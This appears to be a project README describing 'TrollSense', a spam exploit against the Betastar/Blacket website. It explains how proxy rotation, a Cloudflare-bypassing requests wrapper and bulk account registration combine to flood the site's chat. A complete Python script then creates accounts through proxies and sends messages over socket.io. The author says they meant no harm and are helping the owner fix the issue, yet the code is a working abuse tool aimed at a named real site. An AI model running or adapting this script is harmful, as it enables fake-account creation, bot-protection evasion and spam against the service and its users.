## I (l2vy7) discovered a HUGE spam exploit on Betastar.
All Betastar/Blacket API endpoints are insecure, and everyone knows that.  
But now, since Betastar has a chat function, insecurity makes exploits very awful.  

### How it's made: TrollSense for Betastar
Basically, I made a separate (private) proxy generator, and copied over the proxies to proxies.txt in the folder, and set up a proxy lister.  
I also implemented a CloudFlare bypassing ```requests``` wrapper because I'm not waiting hours for Undetected ChromeDriver to work.  
Since all logins are ip-based, and each time you load a page in Betastar, it checks with the login information provider, you don't even have to work with any HTTP cookies or anything. Just direct IPs, you can even skip the login information checking process if you want.  
After that, I just loop through the proxies, make accounts with random names and the password "THEWORLDISONFIRE", check for invalid proxies, rinse and repeat.  
Then, I find existing accounts and extend the current accounts if the accounts file exists.  
Finally, I loop through the working ips with accounts linked to them, use a requests session to connect to the chat server via a socketio-python client and the current proxy, and emit "smes" with a set message attached.

## Xotic has implemented captchas for registration.
Though I'm not entirely sure if this will affect socket.io data or the registration API, I'm 99% sure he will do something to stop this from working.  

I just kept this here as a documentation on how vulnerable websites can be easily exploited.  
**I'm helping Xotic fix this. Please note that I meant no harm in making this exploit.**


```py
from requests.exceptions import *
from os.path import exists
from faker import Faker
import cloudscraper
import traceback
import requests
import socketio
import logging
import random
import string
import base64
import sys

fake = Faker()

ips = []

for x in open('proxies.txt', 'r').read().split('\n'):
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'android',
            'desktop': False
        },
        disableCloudflareV1=True
    )

    try:
        resp = scraper.post("http://betastar.org/api/register/", headers = {"User-Agent" : fake.chrome()}, data=("username=" + ''.join(random.choices(string.ascii_uppercase + string.digits, k = 7)) + "&password=" + base64.b64encode("THEWORLDISONFIRE".encode("utf-8")).decode("utf-8") ), proxies={"http" : 'http://'+x})
        print('Account created.')
        ips.append(x)
    except ProxyError as e:
        pass
    except HTTPError as e:
        pass
    except TooManyRedirects as e:
        pass
    except Exception as e:
        pass

if exists('accounts.txt'):
    ips.extend(open('accounts.txt', 'r').read().split('\n'))

for x in ips:
    with open('accounts.txt', 'w') as x1:
        x1.write(x + '\n')
    session = requests.session()
    session.proxies = {"http" : "http://"+x}
    sio = socketio.Client(http_session=session)
    sio.connect(
        'http://betastar.org/chat/',
        transports='websocket'
    )
    sio.emit('smes', 'Insecure API endpoint test worked.')
    sio.disconnect()
```
